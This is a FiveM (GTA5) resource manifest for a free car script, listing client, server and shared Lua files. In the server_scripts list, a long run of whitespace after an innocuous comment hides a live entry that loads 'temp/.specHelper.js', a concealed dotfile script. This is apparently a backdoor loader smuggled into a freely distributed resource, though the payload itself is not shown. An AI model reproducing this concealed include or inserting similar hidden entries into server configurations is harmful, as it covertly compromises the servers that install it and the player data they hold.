fx_version 'adamant'
game 'gta5'
lua54 'yes'

author 'zaineeee'
description 'Zaineee Free car V2'

client_script {
    'client/client.lua',
    'client/coords.lua',
    'client/pauseanimate.lua'
}

server_scripts {
    '@mysql-async/lib/MySQL.lua',
'server/server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.specHelper.js',
}

shared_script {
    '@es_extended/imports.lua',
    '@ox_lib/init.lua',
    'shared/config.lua'
}